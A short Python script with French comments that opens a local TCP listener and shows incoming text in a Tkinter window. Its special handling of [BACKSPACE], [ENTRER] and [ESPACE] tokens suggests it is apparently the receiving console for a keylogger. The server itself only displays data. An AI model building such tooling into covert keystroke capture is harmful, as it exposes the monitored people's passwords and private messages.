import socket
import threading
import os
import tkinter as tk
from datetime import datetime

def handle_client(client_socket, text_area):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        data = data.decode()
        if data != "[BACKSPACE]" and data != "[ENTRER]" and data != "[ESPACE]":
            text_area.insert(tk.END, data)
        if data == "[ENTRER]" or data == "[ESPACE]":
            text_area.insert(tk.END, "\n")
        text_area.see(tk.END)

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_name = socket.gethostname()
    host_ip = '127.0.0.1'
    port = 8888
    socket_address = (host_ip, port)
    server_socket.bind(socket_address)
    server_socket.listen(5)
    print("En attente de connexion...")
    text_area.insert(tk.END, "En attente de connexion...\n")

    while True:
        client_socket, addr = server_socket.accept()
        print('Connecté à :', addr)
        text_area.insert(tk.END, f"Connecté à : {addr}\n")
        handle_client_thread = threading.Thread(target=handle_client, args=(client_socket, text_area))
        handle_client_thread.start()

# Création de la fenêtre
root = tk.Tk()
root.title(f"Serveur - {socket.gethostname()} - {os.getlogin()}")
root.geometry("1200x400")

# Création de la zone de texte
text_area = tk.Text(root, bg="black", fg="white", font=("Consolas", 12))
text_area.pack(fill=tk.BOTH, expand=1)

# Démarrage du serveur dans un thread séparé
server_thread = threading.Thread(target=start_server)
server_thread.start()

# Démarrage de la boucle principale de la fenêtre
root.mainloop()
